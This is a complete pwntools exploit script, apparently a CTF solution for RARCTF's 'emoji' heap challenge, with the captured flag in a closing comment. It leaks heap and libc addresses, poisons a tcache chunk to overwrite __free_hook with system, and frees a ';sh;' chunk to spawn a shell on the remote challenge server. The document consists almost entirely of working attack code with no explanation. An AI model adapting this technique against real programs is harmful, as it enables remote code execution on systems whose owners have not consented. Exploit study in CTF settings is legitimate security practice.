from pwn import *

p = remote('193.57.159.27','58197')
#p = process('./emoji')
elf = ELF('./emoji')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def Add(title,emoji,data):
    p.sendlineafter('> ',str(1))
    p.sendafter('Enter title: ',title)
    p.sendafter('Enter emoji: ',emoji)
    p.send(data)

def Read(idx):
    p.sendlineafter('> ',str(2))
    p.sendlineafter('Enter index to read: ',str(idx))

def Dele(idx):
    p.sendlineafter('> ',str(3))
    p.sendlineafter('Enter index to delete: ',str(idx))

def Collect():
    p.sendlineafter('> ',str(4))

#context.log_level = 'debug'
for i in range(8):
    Add('A'*0x10,b'\xff','B')
for i in range(8):
    Dele(7-i)
Collect()

Add('A',b'\xff','B')
Read(0)
p.recvuntil('Title: ')
heap = u64(p.recv(6)+b'\x00\x00')-0x1441
p.info('heap_base: '+hex(heap))

Dele(0)
Collect()

payload = b'B'*3+p8((heap+0x12d0)&0xff)+p8(((heap+0x12d0)>>8)&0xff)
Add('A',b'\xff',payload)
Read(0)
p.recvuntil('Title: ')
libc_base = u64(p.recv(6)+b'\x00\x00')-0x1ebbe0
p.info('libc_base: '+hex(libc_base))
payload = b'C'*3+p8((heap+0x1490)&0xff)+p8(((heap+0x1490)>>8)&0xff)
Add(b'A'*0x50+p64(0)+p64(0x91),b'\xff','C'*0x3) #1
Add(b'A'*0x30+p64(0)+p64(0x51),b'\xff',payload) #2
Dele(2)
Collect()
Dele(1)
Collect()
Add(b'B'*0x50+p64(0)+p64(0x91)+p64(libc_base+libc.sym['__free_hook']),b'\xff','C'*0x3) #1
system = libc_base + libc.sym['system']
Add(b'A',b'\xff',';sh;') #2
Add(p64(system),b'\xff','D'*0x3) #3
Dele(2)
Collect()


#gdb.attach(p)
p.interactive()
#rarctf{tru5t_th3_f1r5t_byt3_1bc8d429}
